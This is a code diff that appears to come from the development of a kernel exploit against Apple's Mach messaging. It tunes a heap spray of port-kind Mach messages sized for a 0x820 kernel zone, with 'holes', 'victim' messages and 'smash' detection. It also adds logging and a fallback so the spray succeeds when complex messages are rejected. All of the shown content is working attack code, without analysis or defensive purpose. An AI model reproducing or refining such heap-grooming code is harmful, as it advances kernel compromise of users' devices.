@@ -44,7 +44,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P073_BUILD @"p073-second-table-v7-portkind"
+#define P073_BUILD @"p073-second-table-v7b-portkind-robust"
 
 /* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class) */
 #define P073_MSG_SIZE     0x7FCu
@@ -283,8 +283,15 @@ static BOOL p073_send_portkind(mach_port_t port, uint32_t index) {
     h->msgh_remote_port = port;
     h->msgh_local_port = MACH_PORT_NULL;
     h->msgh_id = (int)(P073_MAGIC | (int)(index & 0xFFFFu));
-    return mach_msg(h, MACH_SEND_MSG, P073_MSG_SIZE, 0,
-                    MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL) == MACH_MSG_SUCCESS;
+    mach_msg_return_t mr = mach_msg(h, MACH_SEND_MSG, P073_MSG_SIZE, 0,
+                    MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+    if (mr != MACH_MSG_SUCCESS) {
+        p073_log(@"  [!] portkind send idx=%u mr=0x%x (%s) — complex shape rejected",
+                 index, mr,
+                 mr == 0x10000004 ? "MSGBIG" : mr == 0x1000000b ? "SEINVDATA" : "other");
+        return NO;
+    }
+    return YES;
 }
 
 /* recv one port-kind victim; -1 = processed with evidence (smash seen),
@@ -574,9 +581,17 @@ static NSURL *p073_model_url(NSString *name) {
     }
     for (uint32_t i = 0; i < P073_N_SENT; i++) {
         mach_port_t p = p073_make_port();
-        if (p == MACH_PORT_NULL) break;
+        if (p == MACH_PORT_NULL) {
+            p073_log(@"  [v7b] sentPost[i=%u] make_port NULL — band aborted at %u", i, nPost);
+            break;
+        }
         sentPost[nPost].port = p; sentPost[nPost].index = 0x3000u | i; sentPost[nPost].alive = YES;
-        if (!p073_send_portkind(p, sentPost[nPost].index)) break;
+        /* v7b: port-kind first; on rejection fall back to the proven simple
+           shape so the band survives the round (mr logged at the sender). */
+        if (!p073_send_portkind(p, sentPost[nPost].index)) {
+            p073_log(@"  [v7b] falling back to simple for sentPost[%u]", sentPost[nPost].index);
+            if (!p073_send_simple(p, sentPost[nPost].index)) break;
+        }
         nPost++;
     }
     p073_log(@"[+] spray: sentPre=%u holes=%u sentPost=%u PORTKIND (kdata=0x820 each, v7 desc door)",
